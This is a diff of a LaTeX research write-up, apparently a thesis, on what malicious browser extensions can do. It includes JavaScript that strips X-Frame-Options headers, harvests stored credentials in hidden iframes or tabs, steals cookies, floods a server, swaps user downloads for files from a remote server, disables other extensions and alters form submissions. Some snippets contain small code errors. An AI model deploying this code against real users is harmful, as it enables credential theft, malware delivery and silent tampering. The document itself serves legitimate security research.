-	The first technique is the least reliable one. There exists several methods to enforce that a web page is not displayed in an iframe. The standardized approach is to use the \texttt{X-Frame-Option} HTTP header which is compatible with all current browsers \cite{xFrameOptionsSpezification, xFrameOptionsCompability}. This transfers the responsibility to enforce the policy to the browser. Other approaches use JavaScript to deny the web page's functionality if it is loaded in an iframe or simply move the web page from the iframe to the main frame.
-	
-	Our implementation removes the \texttt{X-Frame-Option} from any incoming web request to be able to load particular web pages into an iframe and steal probably stored credentials. For that purpose, it needs the permissions \texttt{"webRequest"}, \texttt{"webRequestBlocking"}, \texttt{"https://*/*"}, and \texttt{"http://*/*"}. The implementation is shown in \autoref{code:removeXFrameOptionsHeader}. We begin by adding an event listener which is triggered if the browser receives the headers of a web request's response (line 1). In the listener, we iterate over all headers (line 2). If the current header is the X-Frame-Options header, we remove it from the headers array (lines 3-5). Finally we return the modified header's list and consequently continue the web request's processing.
-	
-	\begin{code}
-		\begin{lstlisting}
-chrome.webRequest.onHeadersReceived.addListener(function(details) { 
-	details.responseHeaders.forEach(function(header, index){
-		if(header.name.toLowerCase() === "x-frame-options"){
-			details.responseHeaders.splice(index,1);
-		}
-	});
-	return({responseHeaders: details.responseHeaders});
-},
-{urls: ['https://*/*', 'http://*/*']}, ['blocking', 'responseHeaders']);
-\end{lstlisting}
-		\caption{Extension code to remove the \texttt{X-Frame-Options} header from any incoming web request.}
-		\label{code:removeXFrameOptionsHeader}
-	\end{code} 
-	
-	To open a particular web page in an iframe, we use a content script with the \texttt{any\_frame} option which enables that the content script is executed in iframes, too. Our implementation is shown in \autoref{code:openWebPageInIframe}. It checks whether or not it is currently active in the main frame (line 1). If it is active in an iframe, we use the implementation shown in \autoref{code:stealCredentialsFromPasswordManager} to steal the probably stored credentials. If the content script is currently active in the main frame, we send a message to the extension's background to retrieve a URL (line 2). This is necessary because the content script itself can not store data - in our case a list of URLs - between different instances of itself. Then, we create a new iframe (line 3), turn it invisible for the user by setting its display property (line 4), set it's source attribute to the given URL which subsequently loads the targeted web page (line 5), and finally add it to the web page's DOM (line 6). 
+	The first approach is the least reliable one. There exists several methods to enforce that a web page is not displayed in an iframe. The standardized approach is to use the \texttt{X-Frame-Option} HTTP header which is compatible with all current browsers \cite{xFrameOptionsSpezification, xFrameOptionsCompability}. This transfers the responsibility to enforce that the web page is not loaded into an iframe to the browser. Other approaches use JavaScript to deny the web page's functionality if it is loaded in an iframe or to move the web page from the iframe to the main frame. %TODO refernce to remofe header?
+		
+	To open a particular web page in an iframe, we use a content script with the \texttt{any\_frame} option which enables that the content script is executed in iframes, too. Our implementation is shown in \autoref{code:openWebPageInIframe}. It checks whether or not it is currently active in the main frame (line 1). If it is active in an iframe, we execute another attack in the scope of the loaded web page. If the content script is currently active in the main frame, we send a message to the extension's background to retrieve a URL (line 2). This is necessary because the content script itself can not store data - in our case a list of URLs - between different instances of itself. Then, we create a new iframe (line 3), turn it invisible for the user by setting its display property (line 4), set it's source attribute to the given URL which subsequently loads the targeted web page (line 5), and finally add it to the web page's DOM (line 6). 
 	
 	\begin{code}
 		\begin{lstlisting}
@@ -371,15 +473,15 @@ if(window.self === window.top) {
 		\label{code:openWebPageInIframe}
 	\end{code}
 	
-	The second and third technique work very similar. Both use the browser's tab system to open a particular web page and inject a content script in it to steal probably stored credentials. 
+	The second and third approach work very similar. Both use the browser's tab system to open a particular web page and inject a content script in it to steal probably stored credentials. Therefore, the extension needs the \texttt{http://*/*} and \texttt{https://*/*} host permissions and for the second approach additionally the \texttt{tabs} permission. 
 	
-	The implementation for the second technique is shown in \autoref{code:openPageInNewBackgroundTab}. First, we query for an inactive tab (line 2) and store its URL (lines 1,3). Then, we update the first found tab and load the targeted web page (line 4). After the tab has finished loading, we inject a content script in the tab which executes the attack shown in \autoref{code:stealCredentialsFromPasswordManager} (lines 5-7). The content script will send a message to indicate that is has finished executing the attack. We await this message and update the tab from which the message originates with the stored URL to load the original web page (lines 10-12).
+	The implementation for the second approach is shown in \autoref{code:openPageInNewBackgroundTab}. First, we query for an inactive tab (line 2) and store its URL (lines 1,3). To access the URL, the \texttt{tabs} permission is necessary. Then, we update the first found tab and load the targeted web page (line 4). After the tab has finished loading, we inject a content script in the tab which executes a particular attack (lines 5-7). Additionally, the content script will send a message to indicate that is has finished executing the attack. We await this message and update the tab from which the message originates with the stored URL to load the original web page (lines 10-12).
 		
 	\begin{code}
 		\begin{lstlisting}
 var storedURL;
 chrome.tabs.query({ active: false }, function(tabs) {	
-	var storedURL = tabs[0].url;
+	storedURL = tabs[0].url;
 	chrome.tabs.update(tabs[0].id, {url: TARGET_URL}, function(tab) {
 		waitUntilTabHasFinishedLoading(function() {
 			chrome.tabs.executeScript(tab.id, {file: 'content.js'});	
@@ -394,7 +496,7 @@ chrome.runtime.onMessage.addListener(function(message, sender) {
 		\label{code:openPageInInactiveTab}
 	\end{code}
 	
-	And the implementation for the third technique is shown in \autoref{code:openPageInNewBackgroundTab}. Instead of querying for an inactive tab like before, we query for a tab in a window which is not the currently active window (line 1). Following, we create a new tab in the same window as the queried tab and load the targeted web page (line 2). We wait until the tab has finished loading and then inject a content script with the implementation from \autoref{code:stealCredentialsFromPasswordManager} (lines 3-5). Again, we await the message that the content script has finished and consequently remove the before created tab (line 8-10).
+	Our implementation for the third technique is shown in \autoref{code:openPageInNewBackgroundTab}. Instead of querying for an inactive tab like before, we query for a tab in a window which is not the currently active window (line 1). Next, we create a new tab in the same window as the queried tab and load the targeted web page (line 2). We wait until the tab has finished loading and then inject a content script with the implementation of a particular attack (lines 3-5). Again, we await the message that the content script has finished and consequently remove the before created tab (line 8-10).
 
 	\begin{code}
 		\begin{lstlisting}
@@ -413,11 +515,38 @@ chrome.runtime.onMessage.addListener(function(message, sender) {
 		\label{code:openPageInNewBackgroundTab}
 	\end{code}
 			
-	We tested our implementations in Chrome, Opera, and Firefox. To our surprise, they were only successful in Firefox. The reason that none of our attacks work in Chrome and Opera is that JavaScript has no access to the value of a password input field before any user interaction with the web page occurred. What first seems like a bug is an intended security feature to prevent exactly this kind of attack \cite{chromiumBlogPasswordInput}.
+	We tested our implementations in Chrome, Opera, and Firefox with the attack shown in \autoref{code:stealCredentialsFromPasswordManager} to steal probably stored credentials from the browser's password manager. To our surprise, they were only successful in Firefox. The reason that the attack does not work in Chrome and Opera is that JavaScript has no access to the value of a password input field before any user interaction with the web page occurred. What first seems like a bug is an intended security feature to prevent exactly this kind of attack \cite{chromiumBlogPasswordInput}.
 
 
-\subsection{Manipulate Download Files}
 
+\subsection{Attacks With Content Scripts}
+
+\subsubsection{Denial Of Service}
+
+	First, we create a new iframe element (line 1), set its CSS property to make it invisible for the user (line 2), and append it to the web page's DOM (line 3). Then, we set the URL for the iframe to fire a HTTP request to the targeted server and add a random number as parameter to prevent that the browser fetches the targeted web page from its cache (line 5). We repeat this procedure at a fixed interval of 50 milliseconds to give the browser time to execute the request (line 4-6).
+
+	\begin{code}
+		\begin{lstlisting}
+var iframe = document.createElement('iframe');
+iframe.setAttribute('style', 'display:none;');
+document.body.appendChild(iframe);
+var interval = setInterval(function() {	
+	iframe.setAttribute('src', TARGET_URL + '?' + Math.random());
+}, 50);
+\end{lstlisting}
+		\caption{Content Script which executes a DoS attack by calling a URL multiple times with an iframe.}
+		\label{code:DoSWithIframe}
+	\end{code}
+
+
+
+
+
+\subsection{Download Files}
+
+
+	We start by disabling the download status bar of the browser thereby the user does not see the download (line 2). Then, we initiate the download (line 3), wait until the it is finished (line 4), and store the its id (line 5). To open the downloaded file, we need a mouse click from the user. For that purpose we use a content script that appends an on click event to each HTML element and sends a message to the extension's background which also transfers the user's mouse gesture. In the background of our implementation, we await the message from the content script and use the transmitted mouse gesture to open the downloaded file (lines 8-10). Finally, we delete our file from the browser's list of downloads and re-enable the download status bar to prevent that the user notices our attack (lines 11-12).
+	
 	\begin{code}
 		\begin{lstlisting}
 var storedDownloadId = null;
@@ -429,7 +558,8 @@ chrome.downloads.download({	url: REMOTE_SERVER_URL,	method: 'GET' }, function(do
 });		
 chrome.runtime.onMessage.addListener(function() {
 	if(storedDownloadId != null) {
-		chrome.downloads.open(downloadItem.id);		
+		chrome.downloads.open(downloadItem.id);
+		chrome.downloads.erase({id: downloadItem.id});
 		chrome.downloads.setShelfEnabled(true);
 	}
 });
@@ -438,6 +568,9 @@ chrome.runtime.onMessage.addListener(function() {
 		\label{code:downloadAndOpenFile}
 	\end{code}
 	
+	
+	First, we create an event listener that is triggered if the user initiates a new download (line 1). We only target files with a particular mime type and therefore check if the downloading file's mime type matches (line 2). If this is true, we cancel the user's download (line 3), remove the entry from the browser's downloads list and the download status bar (line 4), and initiate the download of a file from our remote server (line 5). We send the name and the mime type of the file that the user wants to download along the request (line 6). This allows us to set the mime type and the filename correctly at our remote server.
+	
 	\begin{code}
 		\begin{lstlisting}
 chrome.downloads.onCreated.addListener(function (downloadItem) {
@@ -445,15 +578,18 @@ chrome.downloads.onCreated.addListener(function (downloadItem) {
 		chrome.downloads.cancel(downloadItem.id);
 		chrome.downloads.erase({ id: downloadItem.id });
 		chrome.downloads.download({
-			url: REMOTE_SERVER_URL + '?filename=' downloadItem.filename + '&mime_type=' + TARGETED_MIME_TYPE,
+			url: REMOTE_SERVER_URL + '?filename=' downloadItem.filename + '&mime_type=' + downloadItem.mime,
 			method: 'GET',
 		});
 	}
 });
 \end{lstlisting}	
-		\caption{Extension code to silently exchange a file that the user currently downloads with a file from our remote server.}	
+		\caption{Extension code to silently exchange a file that the user currently downloads.}	
 		\label{code:exchangeDownloadFile}
 	\end{code}
+	
+	
+	Similar to our attack implementation at \autoref{code:exchangeDownloadFile}, we listen for the user initiating a new download, check for a particular mime type of the downloading file, and wait until the download has finished (lines 1-3). To generate a fake file at our remote server, we extract the name of the downloaded file from its full path on the user operating system (line 4). We remove the downloaded file (lines 5-7) and download our fake file (line 8-10). Again, we forward the name and mime type of the downloaded file to our remote server (line 9).
 	
 	\begin{code}
 		\begin{lstlisting}
@@ -465,7 +601,7 @@ chrome.downloads.onCreated.addListener(function (downloadItem) {
 				chrome.downloads.erase({ id: downloadItem.id });
 			});
 			chrome.downloads.download({
-				url: REMOTE_SERVER_URL + '?filename=' downloadItem.filename + '&mime_type=' + TARGETED_MIME_TYPE,
+				url: REMOTE_SERVER_URL + '?filename=' downloadItem.filename + '&mime_type=' + downloadItem.mime,
 				method: 'GET',
 			});	
 		});
@@ -475,3 +611,111 @@ chrome.downloads.onCreated.addListener(function (downloadItem) {
 		\caption{Extension code to silently exchange a file after the user has downloaded it.}
 		\label{code:exchangeDownloadedFile}
 	\end{code}
+
+
+
+\subsection{Steal Cookies}
+
+	\begin{code}
+		\begin{lstlisting}
+chrome.cookies.getAll({ url: TARGETED_URL }, function(cookies) {
+	send(cookies);
+});
+\end{lstlisting}
+		\caption{Extension code to steal cookies from any website.}
+	\end{code}
+	
+	\begin{code}
+		\begin{lstlisting}
+send(document.cookie.split(';'));
+\end{lstlisting}
+		\caption{Content script to steal cookies from the current web page.}
+	\end{code}
+
+
+
+\subsection{Hamper Extension Management}
+
+	We query for all currently installed extensions (line 1), iterate over the returned list (line 2), check if the extension's name equals our targeted extension (line 3), and finally disable the targeted extension (line 4). 
+
+	\begin{code}
+		\begin{lstlisting}
+chrome.management.getAll(function(infos) {
+	infos.forEach(function(info) {
+		if(info.name === TARGET_EXTENSION_NAME) {
+			chrome.management.setEnabled(info.id, false);
+		}
+	});
+});
+\end{lstlisting}
+		\caption{Extension code to silently disable another extension.}
+	\end{code}
+
+
+
+
+
+\subsection{Web Requests}
+
+	To execute the first approach, our implementation removes the \texttt{X-Frame-Option} from any incoming web request to be able to load particular web pages into an iframe and steal probably stored credentials. For that purpose, it needs the permissions \texttt{"webRequest"}, \texttt{"webRequestBlocking"}, \texttt{"https://*/*"}, and \texttt{"http://*/*"}. 
+
+	We begin by adding an event listener which is triggered if the browser receives the headers of a web request's response (line 1). Additionally, we explicit state that our listener is triggered on any HTTP or HTTPS request, that it is executed in a blocking manner which means the browser waits with the request's processing until our listener finishes, and that our listener has access to the response's headers (line 9). If the listener is triggered, we iterate over all headers (line 2) and compare the header's names. If it equals our targeted header's name, we remove the header from the list (lines 3-5). Finally we return the modified headers list and consequently continue the web request's processing. 
+
+	\begin{code}
+		\begin{lstlisting}
+chrome.webRequest.onHeadersReceived.addListener(function(details) { 
+	details.responseHeaders.forEach(function(header, index){
+		if(header.name.toLowerCase() === TARGETED_HEADER_NAME){
+			details.responseHeaders.splice(index,1);
+		}
+	});
+	return({responseHeaders: details.responseHeaders});
+},
+{urls: ['https://*/*', 'http://*/*']}, ['blocking', 'responseHeaders']);
+\end{lstlisting}
+		\caption{Extension code to remove a probably security relevant header from any incoming web request.}
+		\label{code:removeHTTPResponseHeader}
+	\end{code} 
+
+	Initially, we register a listener that is triggered when the browser initiates a web request (line 1). Like before, the listener is triggered on any HTTP or HTTPS request, the request's processing is blocked while the listener is active, and the listener has access to the request's body (line 8). Because a request does not mandatory have a body with values, we check if the currently processing request has one (line 2). Then, we check if our targeted form data is present (line 3) and exchange its value with a manipulated one (line 4). 
+	
+	\begin{code}
+		\begin{lstlisting}
+chrome.webRequest.onBeforeRequest.addListener(function(details){
+	if(details.requestBody && details.requestBody.formData) {
+		if(details.requestBody.formData[TARGETED_FORM_KEY]) {
+			details.requestBody.formData[TARGETED_FORM_KEY] = MANIPULATED_FORM_VALUE;
+		}
+	}
+},
+{urls: ['https://*/*', 'http://*/*']}, ['blocking', 'requestBody']);
+\end{lstlisting}
+		\caption{Extension code to manipulate an outgoing web requests that contains a form.}
+		\label{code:manipulateWebRequestForm}
+	\end{code}
+	
+	\begin{table}
+		\begin{tabular}{|l|l|} \hline 
+			\textbf{Attack} & \textbf{Needed Permissions} \\ \hline
+			Steal sensitive user data & Content script \\
+			Steal form data & Content script \\
+			Steal credentials & Content script \\
+			\hline
+			Execute concealed attack in iframe & Content script \\
+			Execute concealed attack in inactive tab & \texttt{http://*/*, https://*/*, tabs} \\
+			Execute concealed attack in background window & \texttt{http://*/*, https://*/*} \\
+			\hline
+			Denial of Service & Content script \\
+			\hline
+			Download and open file & \texttt{downloads, downloads.open, downloads.shelf} \\
+			Exchange a downloaded file & \texttt{downloads} \\
+			Exchange a currently downloading file & \texttt{downloads} \\
+			\hline
+			Disable another extension & \texttt{management} \\
+			\hline
+			Remove Security Relevant HTTP Header & \texttt{http://*/*, https://*/*, webRequest, webRequestBlocking} \\
+			Manipulate outgoing web request & \texttt{http://*/*, https://*/*, webRequest, webRequestBlocking} \\
+			\hline
+		\end{tabular}
+		\caption{Summary of implemented attacks with needed permissions.}
+	\end{table}
